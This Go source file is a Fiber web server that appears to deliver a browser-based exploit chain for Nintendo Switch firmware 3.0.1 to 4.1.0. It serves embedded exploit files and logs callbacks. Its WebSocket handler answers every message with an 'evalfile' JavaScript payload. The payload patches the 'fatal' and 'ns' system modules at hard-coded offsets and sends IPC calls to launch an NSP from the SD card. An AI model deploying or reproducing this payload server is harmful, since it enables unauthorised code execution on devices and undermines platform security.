package main

import (
	"embed"
	"log"
	"net/http"

	"github.com/gofiber/fiber/v2"
	"github.com/gofiber/fiber/v2/middleware/filesystem"
	"github.com/gofiber/websocket/v2"
)

//go:embed files/*
var files embed.FS

func main() {
	app := fiber.New()

	app.Use("/", func(c *fiber.Ctx) error {
		log.Println(c.Method(), c.Path())
		return c.Next()
	})

	app.Use("/", filesystem.New(filesystem.Config{
		Root:       http.FS(files),
		PathPrefix: "files/exploit",
	}))

	app.Post("/cache", func(c *fiber.Ctx) error {
		log.Println("Cache UA: " + string(c.Request().Header.UserAgent()))
		log.Println("Cache: " + string(c.Body()))
		return c.SendString("ok")
	})

	app.Post("/log", func(c *fiber.Ctx) error {
		log.Println("Log: " + string(c.Body()))
		return c.SendString("ok")
	})

	app.Post("/error", func(c *fiber.Ctx) error {
		log.Println("Error: " + string(c.Body()))
		return c.SendString("ok")
	})

	ws := fiber.New()
	ws.Use("/", func(c *fiber.Ctx) error {
		log.Println("WebSocket", c.Method(), c.Path())
		if websocket.IsWebSocketUpgrade(c) {
			c.Locals("allowed", true)
			return c.Next()
		}
		return c.Next()
	})
	ws.Get("/", websocket.New(func(c *websocket.Conn) {
		var (
			mt  int
			msg []byte
			err error
		)
		for {
			if mt, msg, err = c.ReadMessage(); err != nil {
				log.Println("WebSocket read error:", err)
				break
			}
			log.Println("WebSocket recv:", string(msg))

			if err = c.WriteMessage(mt, []byte(wsrsp)); err != nil {
				log.Println("WebSocket write error:", err)
				break
			}
		}
	}))
	go ws.Listen(":8100")

	// log.Fatal(app.Listen(":8080"))
	log.Fatal(app.Listen(":80"))
}

// var wsrsp = `{"cmd":"evalfile","args":["if (!sc.did_init) {\n    if (!sc.didModules) {\n        sc.memcpy = function(dst, src, size) { sc.call(utils.add2(sc.base, 0xF41B08), [dst, src, size]); }\n\n        if (sc.nv.vers == \"3.0.1\") {\n            sc.nv.modules.fatal.writePayloadAndPatch(0x167CB8); // 3.0.1\n        } else if (sc.nv.vers == \"4.0.1\") {\n            sc.nv.modules.fatal.writePayloadAndPatch(0x163278); // 4.0.1\n        } else if (sc.nv.vers == \"4.1.0\") {\n            sc.nv.modules.fatal.writePayloadAndPatch(0x163158); // 4.1.0\n        }\n        \n        \n        try {\n            sc.ipcMsg(0).datau64(sc.nv.modules.fatal.getAslrBase()).setType(5).sendTo('fatal:u');\n        } catch (rr) {\n            sc.killAutoHandle('fatal:u');\n            utils.log('Installed fatal!');\n        }\n        \n        if (sc.nv.vers == \"3.0.1\") {\n            sc.nv.modules.ns.writePayloadAndPatch(0x170ED8); // 3.0.1\n        } else if (sc.nv.vers == \"4.0.1\" || sc.nv.vers == \"4.1.0\") {\n            sc.nv.modules.ns.writePayloadAndPatch(0x190528); // 4.0.0\n        }\n        \n        try{\n            sc.ipcMsg(0).datau64(sc.nv.modules.ns.getAslrBase()).setType(5).sendTo('ns:vm');\n        } catch (rr) {\n            sc.killAutoHandle('ns:vm');\n            utils.log('Installed NS!');\n        }\n        \n        sc.lrHnd = sc.ipcMsg(301).datau64(0).sendTo('ns:vm').assertOk().show().movedHandles[0];\n        \n            sc.ipcMsg(0).datau32(3).sendTo(sc.lrHnd).asResult().andThen(res => {\n            sc.withHandle(res.movedHandles[0], function(hnd) {\n                var path = '@Sdcard://pegascape/caffeine.nsp';\n                var pbuf = utils.str2ab(path + '\\x00')\n                sc.ipcMsg(1).datau64(utils.parseAddr('0100000000001008')).xDescriptor(pbuf, pbuf.byteLength).sendTo(hnd).assertOk().show();\n                sc.nv.prepare_close();\n                prompt(\"Tap the text field below, wait three seconds, then tap the power button.\");\n            });\n        });\n        sc.didModules = true;\n    }\n\n    //window.showAlbumMessage();\n    \n    /*\n    //var path = getNCAPath(utils.parseAddr('010000000000B14A'));\n    //utils.log('Manu path: '+path);\n    sc.ipcMsg(300).datau64(0, [0xB14A, 0x01000000], 3, 0).sendTo('ns:vm').assertOk().show();\n\n    sc.oldGetService = sc.getService;\n    sc.getService = function (name, cb) {\n        if (name === 'fatal:u') {\n            return sc.oldGetService(name, cb);\n        }\n        if (typeof(name) !== \"string\") {\n            throw new Error(\"cannot get service with non-string name\");\n        }\n        if (!sc.hasService(name)) {\n            throw new Error('no such service');\n        }\n\n        var lol = utils.str2u64(name);\n        var r = sc.ipcMsg(4).datau64(lol).sendTo('fatal:u').asResult().map((response) => response.movedHandles[0]);\n        if(cb === undefined) {\n            return r;\n        } else {\n            var h = r.assertOk();\n            try {\n                return cb(h);\n            } finally {\n                sc.svcCloseHandle(h);\n            }\n        }\n    };\n    */\n\n    sc.processes = {}\n    sc.did_init = true;\n}\nalert(\"Success!\");\n"]}`
var wsrsp = `{"cmd":"evalfile","args":["if (!sc.did_init) {\n    if (!sc.didModules) {\n        sc.memcpy = function(dst, src, size) { sc.call(utils.add2(sc.base, 0xF41B08), [dst, src, size]); }\n\n        if (sc.nv.vers == \"3.0.1\") {\n            sc.nv.modules.fatal.writePayloadAndPatch(0x167CB8); // 3.0.1\n        } else if (sc.nv.vers == \"4.0.1\") {\n            sc.nv.modules.fatal.writePayloadAndPatch(0x163278); // 4.0.1\n        } else if (sc.nv.vers == \"4.1.0\") {\n            sc.nv.modules.fatal.writePayloadAndPatch(0x163158); // 4.1.0\n        }\n        \n        \n        try {\n            sc.ipcMsg(0).datau64(sc.nv.modules.fatal.getAslrBase()).setType(5).sendTo('fatal:u');\n        } catch (rr) {\n            sc.killAutoHandle('fatal:u');\n            utils.log('Installed fatal!');\n        }\n        \n        if (sc.nv.vers == \"3.0.1\") {\n            sc.nv.modules.ns.writePayloadAndPatch(0x170ED8); // 3.0.1\n        } else if (sc.nv.vers == \"4.0.1\" || sc.nv.vers == \"4.1.0\") {\n            sc.nv.modules.ns.writePayloadAndPatch(0x190528); // 4.0.0\n        }\n        \n        try{\n            sc.ipcMsg(0).datau64(sc.nv.modules.ns.getAslrBase()).setType(5).sendTo('ns:vm');\n        } catch (rr) {\n            sc.killAutoHandle('ns:vm');\n            utils.log('Installed NS!');\n        }\n        \n        sc.lrHnd = sc.ipcMsg(301).datau64(0).sendTo('ns:vm').assertOk().show().movedHandles[0];\n        \n            sc.ipcMsg(0).datau32(3).sendTo(sc.lrHnd).asResult().andThen(res => {\n            sc.withHandle(res.movedHandles[0], function(hnd) {\n                var path = '@Sdcard://pegascape/caffeine.nsp';\n                var pbuf = utils.str2ab(path + '\\x00')\n                sc.ipcMsg(1).datau64(utils.parseAddr('0100000000001008')).xDescriptor(pbuf, pbuf.byteLength).sendTo(hnd).assertOk().show();\n                sc.nv.prepare_close();\n                prompt(\"Tap the text field below, wait three seconds, then tap the power button.\");\n            });\n        });\n        sc.didModules = true;\n    }\n\n    //window.showAlbumMessage();\n    sc.processes = {}\n    sc.did_init = true;\n}\nalert(\"Success!\");\n"]}`
